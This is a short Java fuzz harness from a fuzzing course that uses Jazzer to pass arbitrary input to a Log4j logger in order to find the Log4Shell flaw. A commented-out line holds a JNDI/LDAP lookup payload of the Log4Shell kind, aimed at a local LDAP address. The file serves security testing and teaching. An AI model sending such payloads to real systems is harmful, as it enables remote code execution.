// Copyright 2021 Patrick Ventuzelo
// Copyright 2021 Fuzzing Labs
//
// Website: https://academy.fuzzinglabs.com/fuzzing-java-code-jazzer

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import com.code_intelligence.jazzer.api.FuzzedDataProvider;

public class Log4jFuzzer {
    private static final Logger logger = LogManager.getLogger(Log4jFuzzer.class);
    public static void fuzzerTestOneInput(FuzzedDataProvider data) {

        // logger.error("${jndi:ldap://127.0.0.1:1389/a}");
        logger.error(data.consumeRemainingAsString());
    }
}